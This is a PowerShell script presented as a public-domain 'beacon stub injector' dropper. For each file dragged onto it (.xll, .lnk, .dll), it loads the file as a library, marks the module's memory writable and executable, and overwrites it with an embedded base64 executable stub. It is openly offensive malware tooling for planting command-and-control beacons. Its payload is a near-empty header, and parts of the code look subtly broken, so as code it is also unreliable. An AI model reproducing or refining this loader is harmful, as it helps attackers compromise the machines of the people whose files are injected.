# RawrZ Beaconism-dropper B.ps1 - Public Domain Beacon Stub Injector
#
# This is free and unencumbered software released into the public domain.
#
# Anyone is free to copy, modify, publish, use, compile, sell, or
# distribute this software, either in source code form or as a compiled
# binary, for any purpose, commercial or non-commercial, and by any
# means.
#
# In jurisdictions that recognize copyright laws, the author or authors
# of this software dedicate any and all copyright interest in the
# software to the public domain. We make this dedication for the benefit
# of the public at large and to the detriment of our heirs and
# successors. We intend this dedication to be an overt act of
# relinquishment in perpetuity of all present and future rights to this
# software under copyright law.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
# IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR
# OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,
# ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
# OTHER DEALINGS IN THE SOFTWARE.
#
# For more information, please refer to <http://unlicense.org/>
#
# Drag-and-drop beacon stub injection
# Drag any .xll / .lnk / .dll onto it → instant in-memory beacon stub injection + cleanup
$args|%{$f=$_;Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class B{[DllImport(\"kernel32\")]static extern IntPtr GetProcAddress(IntPtr m,string p);[DllImport(\"kernel32\")]static extern bool VirtualProtect(IntPtr a,uint s,uint f,out uint o);[DllImport(\"kernel32\")]static extern IntPtr LoadLibrary(string n);static IntPtr W(IntPtr h,string n){IntPtr o;VirtualProtect(h,0x1000,0x40,out o);byte[]s=Convert.FromBase64String(\"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4FAAAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\");Marshal.Copy(s,0,h,s.Length);return h;}public static void D(string f){IntPtr h=LoadLibrary(f);W(h,\"DllMain\");}}';[B]::D($f);Write-Host "✔ beaconised $_" -ForegroundColor Green}
